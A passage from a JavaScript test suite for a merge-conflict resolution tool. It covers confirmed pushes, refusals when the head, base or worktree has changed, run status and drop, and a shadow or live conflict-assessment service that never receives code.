  assert.match(r.ask, /carried to docs\/new\.md by hand/);
  yes(t, doc.id);
  let c = await H.check({ run: t.run });
  assert.match(c.problems[0], /resolved as carried to docs\/new\.md, and docs\/new\.md is unchanged/);
  write(S.loadRun(t.run).worktree, 'docs/new.md', 'new doc\nwith a new paragraph\n');
  c = await H.check({ run: t.run, edits: [{ file: 'docs/new.md', why: 'the paragraph the pull request added, in the file that replaced old.md', source: doc.sources.pr_side[0].sha }] });
  assert.equal(c.verdict, 'resolved_unverified');
  assert.match(git(t.app.repo, 'log', '-n', '1', '--format=%B', c.commit), /docs\/old\.md: deleted, its change carried to docs\/new\.md\./);
});

// ---------------------------------------------------------------- push
test('push: one ordinary push of the merge commit; the worktree goes', async () => {
  const t = opened('mc-push-', { config: { lockfiles: { 'deps.lock': LOCK_COMMAND }, gates: ['true'] } });
  solveAll(t);
  const c = await H.check({ run: t.run });
  assert.equal(c.verdict, 'resolved');
  assert.match(H.push({ run: t.run }).refused, /needs --confirmed/);
  assert.equal(git(t.app.remote, 'rev-parse', 'feat'), t.app.head);
  const wt = S.loadRun(t.run).worktree;
  t.app.patchStub({ prs: { 7: prStub(t.app.head, { mergeable: 'UNKNOWN' }) } });
  const p = H.push({ run: t.run, confirmed: true });
  assert.deepEqual([p.pushed, p.verdict, p.commit, p.worktree_removed], [true, 'pushed', c.commit, true]);
  assert.equal(git(t.app.remote, 'rev-parse', 'feat'), c.commit);
  assert.deepEqual(git(t.app.remote, 'rev-list', '--parents', '-n', '1', 'feat').split(' ').slice(1), [t.app.head, t.app.base]);
  assert.equal(existsSync(wt), false);
  assert.match(p.next, /has not recomputed.*The local feat is one commit behind: `git pull` there\./);
  // The user's own checkout and branch are where they were.
  assert.equal(sha(t.app.repo, 'feat'), t.app.head);
  assert.equal(git(t.app.repo, 'status', '--porcelain'), '');
  assert.throws(() => H.push({ run: t.run, confirmed: true }), /already pushed/);
  assert.equal(S.readLog().filter((e) => e.run === t.run).pop().verdict, 'pushed');
  // The branch now merges with its base.
  const again = H.start({ repo: t.app.repo, args: ['7'] });
  assert.equal(again.blocking[0], 'head_unchanged'); // the stub still names the old head: GitHub and the fetch disagree
  t.app.patchStub({ prs: { 7: prStub(c.commit, { mergeable: 'MERGEABLE' }) } });
  assert.equal(H.start({ repo: t.app.repo, args: ['7'] }).verdict, 'nothing_to_solve');
});

test('push: refused on --no-push, a moved head, a closed pull request and a changed worktree', async () => {
  let t = opened('mc-nopush-', undefined, '--no-push');
  solveAll(t);
  let c = await H.check({ run: t.run });
  assert.equal(c.ask, undefined);
  assert.match(c.push_command, new RegExp(`push origin ${c.commit}:refs/heads/feat$`));
  assert.match(H.push({ run: t.run, confirmed: true }).refused, /--no-push/);
  assert.equal(git(t.app.remote, 'rev-parse', 'feat'), t.app.head);

  t = opened('mc-moved-');
  solveAll(t);
  c = await H.check({ run: t.run });
  write(S.loadRun(t.run).worktree, 'src/extra.ts', 'export {};\n');
  assert.match(H.push({ run: t.run, confirmed: true }).refused, /the worktree changed since check/);
  // A run file that names another commit is not believed.
  const saved = S.loadRun(t.run);
  S.saveRun({ ...saved, checked: { ...saved.checked, commit: t.app.base, tree: git(t.app.repo, 'rev-parse', `${t.app.base}^{tree}`) } });
  assert.match(H.push({ run: t.run, confirmed: true }).refused, /the worktree changed since check|not this run's merge/);
  S.saveRun(saved);
  c = await H.check({ run: t.run, edits: [{ file: 'src/extra.ts', why: 'x', source: t.app.base }] });
  t.app.patchStub({ prs: { 7: prStub(t.app.head, { state: 'CLOSED' }) } });
  let p = H.push({ run: t.run, confirmed: true });
  assert.deepEqual([p.pushed, p.blocking], [false, ['pr_open']]);
  t.app.patchStub({ prs: { 7: prStub(t.app.head) } });
  const moved = pushTo(t.app, 'feat', { 'notes.md': 'more\n' }, 'Another commit on the pull request');
  p = H.push({ run: t.run, confirmed: true });
  assert.deepEqual([p.pushed, p.blocking], [false, ['head_unchanged']]);
  assert.equal(git(t.app.remote, 'rev-parse', 'feat'), moved);
  // And check says the run is over.
  c = await H.check({ run: t.run });
  assert.deepEqual([c.verdict, c.blocking], ['blocked', ['head_unchanged']]);
  assert.equal(H.drop({ run: t.run }).dropped, true);
  assert.equal(existsSync(S.loadRun(t.run).worktree), false);
  assert.equal(H.drop({ run: t.run }).dropped, false);
  // A dropped run is over: it is not opened again with its old answers.
  assert.throws(() => H.open({ run: t.run }), /was dropped/);
  assert.match(H.start({ repo: t.app.repo, args: ['status'] }).mode, /status/);
});

test('push: a base that moved is a warning while the result still merges, and a block when it conflicts again', async () => {
  let t = opened('mc-base-');
  solveAll(t);
  await H.check({ run: t.run });
  pushTo(t.app, 'main', { 'CHANGES.md': 'x\n' }, 'Unrelated (#40)');
  let p = H.push({ run: t.run, confirmed: true });
  assert.deepEqual([p.pushed, p.warnings], [true, ['base_moved']]);

  t = opened('mc-base2-');
  solveAll(t);
  await H.check({ run: t.run });
  pushTo(t.app, 'main', { 'src/price.ts': 'export const price = () => 0;\n' }, 'Rewrite pricing (#41)');
  p = H.push({ run: t.run, confirmed: true });
  assert.deepEqual([p.pushed, p.blocking], [false, ['base_moved']]);
  assert.equal(git(t.app.remote, 'rev-parse', 'feat'), t.app.head);
});

// ---------------------------------------------------------------- status, drop
test('status lists the runs that still have a worktree; drop removes only the run\'s own', () => {
  const t = opened('mc-status-');
  let st = H.start({ repo: t.app.repo, args: ['status'] });
  assert.deepEqual(st.runs.map((r) => [r.run_id, r.pull_request, r.verdict]), [[t.run, 7, 'needs_decision']]);
  const run = S.loadRun(t.run);
  S.saveRun({ ...run, worktree: t.app.repo });
  assert.throws(() => H.drop({ run: t.run }), /is not this run's worktree/);
  S.saveRun(run);
  assert.equal(H.start({ repo: t.app.repo, args: ['drop', t.run] }).dropped, true);
  st = H.start({ repo: t.app.repo, args: ['status'] });
  assert.deepEqual(st.runs, []);
  assert.throws(() => H.resolve({ run: t.run, id: 'c1' }), /has no worktree/);
});

// ---------------------------------------------------------------- Jev
const jevStub = (t, answers) => {
  const f = join(t.app.tmp, 'jev.json');
  writeFileSync(f, JSON.stringify(answers));
  process.env.SOLVE_CONFLICTS_JEV_STUB = f;
  return () => (existsSync(`${f}.sent.jsonl`) ? readFileSync(`${f}.sent.jsonl`, 'utf8') : '');
};
const jevOff = () => {
  delete process.env.SOLVE_CONFLICTS_JEV_STUB;
  delete process.env.SOLVE_CONFLICTS_TEST_CALIBRATED;
  process.env.SOLVE_CONFLICTS_JEV = 'off';
};
const cases = () => C.readJsonl(S.jevLog());

test('Jev in shadow: cases are logged, the code is never sent, and nothing is asked because of it', async () => {
  const t = opened('mc-jev-', { config: { lockfiles: { 'deps.lock': LOCK_COMMAND }, gates: [CALLER_GATE] } });
  solveAll(t);
  write(S.loadRun(t.run).worktree, 'src/caller.ts', 'import { assist } from "./util";\nexport const x = assist();\n');
  process.env.SOLVE_CONFLICTS_JEV = 'shadow';
  const sent = jevStub(t, { 'disagree__*': 0.99, 'adds__*': 0.99, 'adds_edit__*': 0.99, 'adapt__*': 0.01 });
  const before = cases().length;
  const edits = [{ file: 'src/caller.ts', why: 'helper was renamed to assist', source: t.app.rename }];
  try {
    const c = await H.check({ run: t.run, edits });
    assert.deepEqual([c.verdict, c.jev], ['resolved', 'shadow']);
    const logged = cases().slice(before).filter((r) => r.type === 'case');
    // Two hunks: two sides_disagree, one resolution_adds_behaviour (the combined one). One edit: two.
    assert.deepEqual(logged.map((r) => r.question).sort(), ['edit_is_adaptation', 'resolution_adds_behaviour', 'resolution_adds_behaviour', 'sides_disagree', 'sides_disagree']);
    assert.ok(logged.every((r) => r.acted === false && r.mode === 'shadow' && r.skill === 'solve-merge-conflicts'));
    assert.match(sent(), /"base_commits":\["Log prices \(#21\)"\]/);
    assert.match(sent(), /"because_of":"Rename helper to assist \(#22\)"/);
    for (const code of ['amount * 2', 'import tax', 'assist()', 'return n']) assert.ok(!sent().includes(code), `sent ${code}`);
    // A second check asks nothing again.
    await H.check({ run: t.run, edits });
    assert.equal(cases().slice(before).filter((r) => r.type === 'case').length, 5);
  } finally {
    jevOff();
  }
});

test('Jev switched on can add a question and cannot take one away; the answer labels the case', async () => {
  const t = opened('mc-jev2-');
  const price = t.by['src/price.ts'];
  res(t, price.hunks[0].id, price, 'both', { first: 'pr' }); // free by the script's own check
  res(t, price.hunks[1].id, price, 'pr'); // asked by the script
  res(t, t.by['docs/old.md'].id, t.by['docs/old.md'], 'delete');
  yes(t, t.by['docs/old.md'].id);
  res(t, t.by['img/logo.bin'].id, t.by['img/logo.bin'], 'base');
  yes(t, t.by['img/logo.bin'].id);
  yes(t, price.hunks[1].id);
  process.env.SOLVE_CONFLICTS_JEV = 'live';
  process.env.SOLVE_CONFLICTS_TEST_CALIBRATED = 'sides_disagree';
  jevStub(t, { 'disagree__0': 0.9, 'disagree__1': 0.0 });
  const before = cases().length;
  try {
    let c = await H.check({ run: t.run });
    assert.equal(c.verdict, 'needs_decision');
    assert.deepEqual(c.asks.map((a) => [a.id, a.reason]), [[price.hunks[0].id, 'Jev reads the two sides as wanting different things here']]);
    // Jev said the second hunk's sides agree. The script's question about it was already answered, and stays asked in the summary.
    yes(t, price.hunks[0].id);
    c = await H.check({ run: t.run });
    assert.equal(c.verdict, 'resolved_unverified');
    assert.equal(c.summary.resolutions.find((r) => r.id === price.hunks[1].id).asked, true);
    const labels = cases().slice(before).filter((r) => r.type === 'label');
    // One side kept: they disagreed. Both kept whole, confirmed by the user: they did not.
    assert.deepEqual(labels.map((l) => l.label).sort(), [false, true]);
    assert.ok(labels.every((l) => l.question === 'sides_disagree' && l.source === 'decision'));
  } finally {
    jevOff();
  }
});

test('Jev unreachable changes nothing', async () => {
  const t = opened('mc-jev3-');
  solveAll(t);
  process.env.SOLVE_CONFLICTS_JEV = 'live';
  jevStub(t, { __degraded: true });
  try {
    const c = await H.check({ run: t.run });
    assert.deepEqual([c.verdict, c.jev], ['resolved_unverified', 'degraded']);
  } finally {
    jevOff();
  }
});
